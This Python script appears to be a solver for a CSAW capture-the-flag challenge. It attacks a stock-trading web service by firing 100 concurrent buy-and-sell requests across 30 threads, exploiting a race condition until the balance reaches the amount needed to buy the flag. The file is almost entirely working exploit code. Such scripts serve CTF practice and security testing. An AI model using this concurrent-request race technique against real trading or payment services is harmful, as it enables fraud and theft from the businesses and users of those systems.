#!/usr/bin/env python3
import requests
import random
import string
import time
import concurrent.futures
import json
import sys

# Target URL
BASE_URL = "http://android-dropper.csaw.io:4657"

# Generate unique user ID
user_id = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
print(f"Generated user ID: {user_id}")

# Target the most valuable stocks
VALUABLE_STOCKS = {
    "BURPSHARKHAT": 1723.44,
    "BROOKING": 1522.33
}

def list_stocks():
    """List available stocks"""
    response = requests.get(f"{BASE_URL}/listCalls")
    if response.status_code == 200:
        try:
            stocks = response.json()
            return stocks
        except:
            print("Failed to parse stocks JSON")
            return {}
    print(f"Failed to get stocks, status code: {response.status_code}")
    return {}

def check_balance():
    """Check the current balance"""
    try:
        response = requests.post(f"{BASE_URL}/login", data={"key": user_id})
        if response.status_code == 200:
            try:
                data = response.json()
                return data.get("balance", 0)
            except:
                print(f"Failed to parse balance JSON: {response.text}")
                return 0
        print(f"Failed to check balance, status code: {response.status_code}")
        return 0
    except Exception as e:
        print(f"Exception in check_balance: {e}")
        return 0

def buy_stock(stock):
    """Buy the given stock"""
    try:
        response = requests.post(f"{BASE_URL}/buy", data={"key": user_id, "stock": stock})
        return response.text
    except Exception as e:
        print(f"Exception in buy_stock: {e}")
        return ""

def sell_stock(stock):
    """Sell the given stock"""
    try:
        response = requests.post(f"{BASE_URL}/sell", data={"key": user_id, "stock": stock})
        return response.text
    except Exception as e:
        print(f"Exception in sell_stock: {e}")
        return ""

def exploit_race_condition(stock):
    """Exploit the race condition by buying and immediately selling a stock"""
    try:
        buy_response = buy_stock(stock)
        sell_response = sell_stock(stock)
        return (buy_response, sell_response)
    except Exception as e:
        print(f"Error in exploit_race_condition: {e}")
        return ("", "")

def get_flag():
    """Request the flag"""
    try:
        response = requests.post(f"{BASE_URL}/flag", data={"key": user_id})
        return response.text
    except Exception as e:
        print(f"Exception in get_flag: {e}")
        return ""

def main():
    # List stocks to confirm connection
    stocks = list_stocks()
    if stocks:
        print("Available stocks:")
        for stock_id, stock_info in stocks.items():
            print(f"{stock_info['name']} - ${stock_info['price']}")
    else:
        print("No stocks found or couldn't connect to server.")
        sys.exit(1)

    # Initial check
    initial_balance = check_balance()
    print(f"Initial balance: ${initial_balance}")

    # Find most valuable stock ID
    most_valuable_stock = None
    highest_price = 0
    for stock_id, stock_info in stocks.items():
        if stock_info["price"] > highest_price:
            highest_price = stock_info["price"]
            most_valuable_stock = stock_id

    if most_valuable_stock:
        print(f"Most valuable stock: {stocks[most_valuable_stock]['name']} (ID: {most_valuable_stock}) - ${highest_price}")
        target_stock = most_valuable_stock
    else:
        print("Couldn't determine most valuable stock, defaulting to BURPSHARKHAT")
        target_stock = "BURPSHARKHAT"

    round_count = 0

    # Exploit loop
    while True:
        round_count += 1
        print(f"\n--- Round {round_count} ---")

        current_balance = check_balance()
        print(f"Current balance: ${current_balance}")

        # If we have enough money, get the flag
        if current_balance >= 9001:
            print("We have enough money to buy the flag!")
            flag = get_flag()
            print(f"Flag: {flag}")
            break

        # Execute a burst of exploitation attempts
        print(f"Attempting exploitation with stock {target_stock}...")

        # Use ThreadPoolExecutor to send requests simultaneously
        successful_exploits = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            # Submit multiple tasks to exploit the race condition
            futures = [executor.submit(exploit_race_condition, target_stock) for _ in range(100)]

            # Process results as they come in
            for future in concurrent.futures.as_completed(futures):
                try:
                    buy_response, sell_response = future.result()
                    if "SUCCESS" in buy_response and "SUCCESS" in sell_response:
                        successful_exploits += 1
                except Exception as e:
                    print(f"Error processing future: {e}")

        print(f"Completed exploitation round. Successful exploits: {successful_exploits}")

        # Sleep for a moment to allow the throttling to reset
        print("Waiting for throttle reset...")
        time.sleep(10)

        # Abort if taking too long (for testing purposes)
        if round_count >= 20:
            print("Maximum rounds reached, stopping.")
            break

if __name__ == "__main__":
    main()

